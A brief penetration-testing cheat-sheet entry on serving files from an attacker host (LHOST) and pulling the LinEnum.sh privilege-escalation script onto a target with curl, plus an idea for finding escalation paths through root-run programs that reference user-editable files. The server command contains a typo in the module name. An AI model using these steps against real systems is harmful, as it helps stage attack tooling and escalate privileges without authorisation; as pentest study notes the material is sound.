**Downloading files from LHOST to RHOST**

Start a webserver on `LHOST`
```sh
user@LHOST $ python -m SimpleHTPPServer
```

Where to put the files?

```
user@RHOST $ curl LHOST/LinEnum.sh
```


Random idea, search content of files for other filenames and their permissions recursively.
Point being that you may discover an exploit vector.
Example: Program A is run by `root` and it refers program B which refers program C which can be edited
by a lower level user.
